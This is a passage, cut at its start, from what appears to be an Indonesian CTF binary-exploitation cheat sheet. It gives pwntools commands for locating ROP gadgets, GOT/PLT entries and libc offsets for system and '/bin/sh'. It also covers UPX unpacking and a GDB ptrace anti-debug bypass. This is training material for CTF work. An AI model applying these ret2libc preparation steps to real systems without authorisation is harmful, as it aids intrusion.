print('win:', hex(elf.symbols.get('win', 0)))
print('gets:', hex(elf.plt.get('gets', 0)))
print('puts@got:', hex(elf.got.get('puts', 0)))
rop = ROP(elf)
print('pop rdi:', hex(rop.find_gadget(['pop rdi','ret']).address))
"

# === LIBC INFO ===
nm -D ./libc.so.6 | grep " puts"
strings -a -t x ./libc.so.6 | grep "/bin/sh"
python3 -c "
from pwn import *
libc = ELF('./libc.so.6')
print('puts offset:', hex(libc.symbols['puts']))
print('system offset:', hex(libc.symbols['system']))
print('/bin/sh offset:', hex(next(libc.search(b'/bin/sh'))))
"

# === UNPACK ===
cp ./challenge ./challenge.bak && upx -d ./challenge

# === ANTI-DEBUG BYPASS ===
# GDB: catch syscall ptrace → run → finish → set $rax=0 → continue

# === STACK ALIGNMENT FIX ===
# Jika movaps crash: tambah RET gadget sebelum SYSTEM dalam payload
```

---

> **➡️ CROSS-WORKFLOW REFERENCES:**
> 
> - **File 48** (`binary_analysis_workflow.md`) — Analisis mendalam properti ELF sebelum masuk ke sini
> - **File 49** (`buffer_overflow_workflow.md`) — Detail teknik BOF, ret2win, FSB, ret2libc
> - **File 50** (`rop_chain_workflow.md`) — Detail ROP gadget chain, PIE bypass, one_gadget
> - **File 51** (`reverse_engineering_workflow.md`) — Detail Ghidra workflow, GDB dynamic analysis, binary patching
> - **File 53** (`crypto_identification_workflow.md`) — Jika RE challenge melibatkan kriptografi serius